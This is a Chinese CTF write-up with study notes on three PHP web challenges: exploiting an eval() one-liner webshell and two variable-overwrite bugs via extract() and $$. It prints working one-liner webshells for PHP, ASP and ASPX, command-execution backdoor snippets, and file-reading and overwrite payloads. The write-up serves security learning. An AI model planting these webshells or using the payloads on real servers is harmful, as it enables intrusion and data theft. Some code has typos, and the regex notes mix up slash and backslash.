basic rce

http://www.henuctf.com:2077/yijuhua/

一.审题

该题是考察一句话木马。查找资料后发现这题有点像【bugkuctf】过狗一句话，hack在目标服务器已经放置好了一句话木马，题中有个eval($_GET['a'])函数，这标志着我们只需要利用好这个木马，读取flag文件。

二.学习笔记

1.什么是一句话木马

  1. 文件上传是大部分web应用都具备的功能，如用户上传文件，头像等。
  2. 正常上传的文件一般是图片文档视频等，web应用收集后放在后台，等待用户调用返回
  3. 如果恶意文件如PHP、ASP等执行文件绕过web应用并顺利执行，则相当于hacker直接拿到webshell
  4. 一旦hacker拿到了webshell，则可以拿到web应用的数据，删除web文件，本地提取，进一步拿下整个服务器甚至内网
  5. SQL注入的对象是数据库服务，而文件上传漏洞主要攻击web服务，两种渗透相结合以达到对目标深度控制
  6. 常用的工具为中国菜刀和中国蚁剑

2.入侵条件

（1）木马上传成功，未被杀；
（2）知道木马的路径在哪；
（3）上传的木马能正常运行。

3.漏洞成因

文件上传漏洞的成因，一方面服务器配置不当会导致任意文件上传；另一方面，Web 应用开放了文件上传功能，并且对上传的文件没有进行足够的限制；再者就是程序开发部署时候，没有考虑到系统特性和验证过滤不严格而导致限制被绕过，上传任意文件。

4.webshell

a.定义

在计算机科学中，Shell 俗称壳（用来区别“核”），是指“为使用者提供操作界面”的软件（命令解释器）。类似于windows 系统给的cmd.exe 或者Linux 下bash 等，虽然这些系统的命令解释器不止一种。

webshell是以asp、php、jsp等网页文件形式存在的一种命令执行环境，也称其为一种网页后门。一般说来，当Hacker入侵一个网站后，会把这些asp、php木马的后门文件放在该网站的web目录中，和正常的网页文件混杂，其命名可能和正常的文件命名很类似，让人无法第一眼通过文件名判断其为后门文件。然后呢，他就可以利用web请求的方式，用asp或者php木马后门控制网站服务器，包括上传下载文件、查看数据库、执行任意程序命令等一系列操作。

b.分类

  1. 大马 就是网站木马。有一类WebShell 之所以叫大马，是因为与小马（一句话木马）区分开，并且代码量较大，但是功能丰富。同样，大马又很多脚本格式，其功能基本相同。每个团队都有自己的定制木马。

    在大马中，我们可以进行文件管理，执行系统命令等，还有一些其他定制功能。

  2. 小马 小马就是一句话木马，因为其代码量比较小，就是一句简单的代码，短小精悍。常见的小马：

    • php的一句话木马： <?php @eval($_POST['pass']);?>

    • asp的一句话是： <%eval request ("pass")%>

    • aspx的一句话是： 

      <%@ Page Language="Jscript"%> <%eval(Request.Item["pass"],"unsafe");%>

而本题涉及的是php小马，所以搜寻了一些php小马方式：

1.system()

<?php
$cmd = $_GET['cmd'];
system($cmd);
?>    //调用system来执行命令

2.exec()

<?php
$cmd = $_GET['cmd'];
echo exec($cmd);
?>   //调用exec执行命令

3.passthru()

<?php
$cmd = $_GET['cmd'];
 passthru($cmd);
 ?>      //调用passthru执行命令

4.echo $cmd

<?php
$cmd = $_GET[‘cmd’] ;
echo `$cmd`;
?>  //调用echo执行命令

5.eval()

<?php
$cmd = =_GET[‘cmd’] ;
eval($cmd)
?>   //通过eval执行命令

本题分析

<?php 
//拿到flag就不要乱玩了哦~ 
error_reporting(0); 
show_source(__FILE__); 
eval($_GET['a']); 
?>

拿本题来看，这是属于第5种类型。$_GET['a']是指目标服务器中小马的密码为a ；show_source(__FILE__);指当使用该函数时，整个文件都将被显示；eval()则是把字符串作为PHP代码执行,例如：eval("echo 'a'");其实就等于直接 echo 'a';再来看看<?php eval($_GET['a']); ?>首先，用get方式接收变量a，比如接收到了：a=echo ‘a’;这时代码就变成<?php eval("echo 'a';"); ?>。也就是说，你想执行什么代码，就把什么代码放进变量a里，用GET传输给一句话木马，你想查看目标硬盘里的文件，可以用php函数：opendir()和readdir()等等。

?a=print_r(readfile('路径'));读取文件
?a=print_r(fopen('路径'));读取文件
?a=print_r(glob('*.php'));读取文件
?a=print_r(scandir(current(localeconv())));扫描目录
?a=print_r(scandir(pos(localeconv())));扫描目录

这题我用?a=print_r(glob('*.php'));抓取了文件所有文件名包含php的文件（.txt没有读取到），读取到了一个像flag的php文件

尝试直接访问文件，无法成功，这里使用system函数读取php文件但是要base64转码，payload：?a=system("cat f111a9.php | base64"); 或者直接 php无参数函数构造， 也就是需要无参数完成 RCE ,a=print_r(readfile(next(array_reverse(scandir(pos(localeconv())))))); *pos(localeconv())等于.*在元素查看器可看到flag

亦或者a=highlight_file(next(array_reverse(scandir(pos(localeconv())))));也有类似的作用不过这是直接在页面中显示

php变量覆盖

http://a16ne.cn:1002/

一.审题，做题分析

由题目可知这是php的变量覆盖，百度后知道变量覆盖漏洞指的是可以用我们的传参值替换原有的变量值。百度后可以大致分析出代码。

$flag='xxxxxxxx'; //给变量flag赋一个值
extract($_GET); //extract函数（变量覆盖的标志），并用get传参
if(isset($liwu)) {  //判断是否声明了变量 liwu      
    $content=trim(file_get_contents($flag));   //file_get_contents函数指打开输出这个文件的内容，而打开的文件名即为赋给flag的值；   trim函数是移除字符串两侧的空白字符或其他预定义字符。功能除去字符串开头和末尾的空格或其他字符。如：" abc "会变成"abc"(无关紧要)； $content=，也是赋值 
    if($liwu==$content) { //判断两个变量是否绝对相等
        echo'flag{xxxxxxxxxxx}'; //相等则输出flag
    } 
    else { echo 'please try other operation.'; //错误则输出。。。
         } 
} 
?>

所以解这题的关键就是使两个变量相等，而flag是已经确定的变量但是我们不知道，不过extract函数的作用就是可以把flag的值给覆盖掉。其中最普遍的方法就是给flag赋一个空值，而文件显示也会变空值，最后content变量也就为空，接着给liwu也赋个空值就相等了。payload：?flag=&liwu= ; 想了下也可直接，?content=&liwu= ；还可以给flag随便赋一个值，只要是目标服务器中没有的文件名就可，如 ?flag=123&liwu=

二.学习笔记

1.extract()变量覆盖

extract()函数能将变量从数组导入当前的符号表，定义：extract(array,extract_rules,prefix)

array 必需。规定要使用的数组
extract_rules 可选。extract() 函数将检查每个键名是否为合法的变量名，同时也检查和符号表中已存在的变量名是否冲突。对不合法和冲突的键名的处理将根据此参数决定
前缀和数组键名之间会自动加上一个下划线

该函数的作用：使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。做了一道题，如：

<?php if ($_SERVER["REQUEST_METHOD"] == "POST") { ?> //判断传参方式为post
            <?php
            extract($_POST);
            if ($pass == $thepassword_123) { ?> //判断输入的pass和已有的thepassword（未知）两个变量是否相等
              <div class="alert alert-success">
                <code><?php echo $theflag; ?>       //相等就输出flag   </code>
              </div>
            <?php } ?>
          <?php } ?>

虽然我们不知道thepassword_123的值，但是extract函数可以覆盖它，所以payload：pass=a&password_123=a

类似的还有parse_str()变量覆盖 import_request_variables()变量覆盖 $$使用不当

2.学习笔记

正则表达式

  • 正则表达式是一种可以用于模式匹配和替换的强大工具。
  • 一个正则表达式，分为三个部分：分隔符，表达式和修饰符。
  • 分隔符可以是除了特殊字符以外的任何字符（比如”/ !”等等），常用的分隔符是”/”。
  • 表达式由一些特殊字符（特殊字符详见下面）和非特殊的字符串组成，比如”[a-z0-9_-]+@[a-z0-9_-.]+”可以匹配一个简单的电子邮件字符串。
  • 修饰符是用来开启或者关闭某种功能/模式。
  • 匹配任何字符串／文本，包括空字符串；*代表任意字符（0个或多个） ls file *
    ? 匹配任何一个字符（不在括号内时）?代表任意1个字符 ls file 0
    [abcd] 匹配abcd中任何一个字符
    [a-z] 表示范围a到z，表示范围的意思 []匹配中括号中任意一个字符 ls file 0

如：/hello.+?hello/is

上面的正则表达式”/”就是分隔符，两个”/”之间的就是表达式，第二个”/”后面的字符串”is”就是修饰符。
  在表达式中如果含有分隔符，那么就需要使用转义符号”/”，比如”/hello.+?//hello/is”。转义符号除了用于分隔符外还可以执行特殊字符，全部由字母构成的特殊字符都需要”/”来转义，比如”/d”代表全体数字。资料参考：https://blog.csdn.net/William0318/article/details/54345526?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160656869119724827695135%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=160656869119724827695135&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-54345526.first_rank_v2_pc_rank_v29&utm_term=php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F&spm=1018.2118.3001.4449

php变量覆盖2

一.审题

该题也是变量覆盖，与之前不同的是这是$$使用不当造成的，首先分析代码。

<?php
highlight_file(__FILE__); 
include "flag.php";  //包含文件
$_403 = "拒绝访问";  //定义参数
$_200 = "欢迎~~~";//定义参数
if ($_SERVER["REQUEST_METHOD"] != "POST")//判断传参方式是否为post
  die("sssssssspost…");//不是post便输出
if ( !isset($_POST["flag"]) )//判断是否post了flag的参数
  die($_403);//不是就输出
foreach ($_GET as $key => $value)//foreach函数来遍历数组中的值，用get方法传输的数据当做数组进行遍历，并将遍历的参数赋值给key，将参数值复制给value。
  $$key = $$value;//这里将键和值又当做变量来使用。我们用get方法传递：_200=flag,经过$$key = $$value的处理后，就会变为$_200=$flag，这样就会将原来的$_200的值覆盖掉，换成$flag的值
foreach ($_POST as $key => $value)//同10，方式变为post
  $$key = $value;//这里将只是将数组键当做下一个变量，将数组的值当做这个$$key的值。例如post方法传入flag=asd，则处理后变成$flag=asd。这样就造成将我们需要获取的flag的值给覆盖掉了
if ( $_POST["flag"] !== $flag )//判断post的flag参数值是否为原本定义的$flag的值，虽然不知道原本的$flag变量值，但是我们可先将$flag的值通过第一个数组遍历赋值给$_200,之后再随便赋给$flag一个值后通过die($_200)输出出来$flag的值，所以$flag原本的值即使被覆盖也无所谓，因为我们早已将$flag的值赋给$_200了，而最后输出的$_200也必然是两个flag变量值，一个为真正的flag一个为随便输入的
      die($_403);//输出$_403
echo "This is your flag : ". $flag . "\n";//输出$flag的值
die($_200);//输出$_200
?>

payload：

Get方法传输：?_200=flag
Post方法传输：flag=asd

二.学习笔记

1.$$变量覆盖

$$ 导致的变量覆盖问题在CTF代码审计题目中经常在foreach中出现，使用foreach来遍历数组中的值，然后再将获取到的数组键名作为变量，数组中的值作为变量的值。因此就产生了变量覆盖漏洞。

2.PHP foreach 遍历数组

foreach 语句用于循环遍历数组。
每进行一次循环，当前数组元素的值就会被赋值给 value 变量(数组指针会逐一地移动) - 以此类推。
它的语法是：
foreach (array as value) 或者foreach (array as $key => $value)【任选其一】{

code to be executed;//要执行的代码

} 注：当试图将其用于其它数据类型或者一个未初始化的变量时会产生错误。

上述语法中，每次循环将当前单元的值赋给 $value 并且数组内部的指针向前移一步。在第二种语法格式中还将当前单元的键名也会在每次循环中赋给变量 $key。

<?php
$arr_day = array("Friday"=>18, "Saterday"=>19, "Sunday"=>20);
foreach ($arr_day as $day) {
    echo $day,'<br />';
}
?>
//输出
18
19
20

使用数组键值：

<?php
$arr_Tro3e = array("T"=>da, "r"=>lao, "o"=>qing， "3"=>dai，"e"=>wo);
foreach ($arr_Tro3e as $key=>$haha) {
    echo $key,': ',$haha,'<br />';
}
?>
//输出
T: da
r: lao
o: qing
3: dai   
e: wo
